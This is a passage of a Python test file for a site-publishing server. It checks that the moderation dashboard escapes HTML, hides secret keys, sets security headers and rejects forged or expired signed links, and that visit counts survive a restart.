    def test_the_dashboard_shows_every_site_and_the_settings_but_no_key(self):
        self.ok("publish_site", {"html": "<title>x</title><input type=password>", "site": "ada-login", "title": "<b>bold</b>"})
        self.ok("publish_site", {"html": "y", "site": "bob-game"}, key=KEY2)
        self.http("/bob-game/", BROWSER)
        code, body, headers = self.http(self.dashboard())
        page = body.decode()
        self.assertEqual(code, 200)
        for text in ("ada-login", "bob-game", "https://pages.example.com/bob-game/", "password field", "/moderation/takedown/ada-login/",
                     "MAX_SITE_MB", "ada, bob, root", "rel=\"noopener noreferrer\""):
            self.assertIn(text, page)
        self.assertIn("&lt;b&gt;bold&lt;/b&gt;", page)
        for secret in (KEY, KEY2, ADMIN):
            self.assertNotIn(secret, page)
        self.assertEqual(headers["Cache-Control"], "no-store")
        self.assertIn("frame-ancestors 'none'", headers["Content-Security-Policy"])

    def test_the_dashboard_counts_publishes_per_agent(self):
        self.ok("publish_site", {"html": "1", "site": "tally"}, key=KEY2)
        self.ok("publish_site", {"html": "2", "site": "tally"}, key=KEY2)
        self.ok("restore_site", {"site": "tally", "version": 1}, key=KEY2)
        code, body, _ = self.http(self.dashboard() + "?format=json")
        data = json.loads(body)
        bob = next(a for a in data["agents"] if a["agent"] == "bob")
        self.assertGreaterEqual(bob["publishes_7d"], 3)
        self.assertEqual(data["days"][-1]["day"], time.strftime("%Y-%m-%d", time.gmtime()))
        self.assertNotIn(KEY2, body.decode())

    def test_a_dashboard_link_cannot_be_forged_or_kept(self):
        path = self.dashboard()
        _, _, name, expires, sig = path.rsplit("/", 4)
        self.assertEqual(self.http(path[:-1] + ("0" if sig[-1] != "0" else "1"))[0], 404)
        self.assertEqual(self.http(path.replace("/root/", "/ada/"))[0], 404)
        secret = __import__("hashlib").sha256(ADMIN.encode()).digest()
        sign = lambda who, when: __import__("hmac").new(secret, f"dashboard:{who}:{when}".encode(), "sha256").hexdigest()[:32]
        past = int(time.time()) - 10
        self.assertEqual(self.http(f"/moderation/dashboard/root/{past}/{sign('root', past)}")[0], 404)
        far = int(time.time()) + 86400 * 365  # longer than DASHBOARD_MINUTES allows, even if signed
        self.assertEqual(self.http(f"/moderation/dashboard/root/{far}/{sign('root', far)}")[0], 404)
        self.assertEqual(self.http(f"/moderation/dashboard/root/{expires}/{sign('root', int(expires))}")[0], 200)


class CountsSurviveARestart(unittest.TestCase):
    def test_counts_are_written_when_the_server_stops(self):
        with tempfile.TemporaryDirectory() as data:
            with socket.socket() as s:
                s.bind(("127.0.0.1", 0))
                port = s.getsockname()[1]
            env = {**os.environ, "DATA_DIR": data, "PORT": str(port), "MCP_KEYS": f"ada:{KEY}", "PUBLIC_URL": "https://pages.example.com",
                   "STATS_FLUSH_SECONDS": "3600"}

            def start():
                proc = subprocess.Popen([sys.executable, "server.py"], cwd=APP, env=env, stdout=subprocess.DEVNULL)
                for _ in range(100):
                    try:
                        urllib.request.urlopen(f"http://127.0.0.1:{port}/health")
                        return proc
                    except OSError:
                        time.sleep(0.05)
                raise RuntimeError("server did not start")

            h = Harness()
            h.base = f"http://127.0.0.1:{port}"
            proc = start()
            try:
                h.ok("publish_site", {"html": "x", "site": "kept"})
                h.http("/kept/", BROWSER)
                h.http("/kept/", BROWSER)
            finally:
                proc.terminate()
                proc.wait()
            proc = start()
            try:
                self.assertEqual(h.ok("list_sites")["sites"][0]["visits_7d"], 2)
            finally:
                proc.terminate()
                proc.wait()
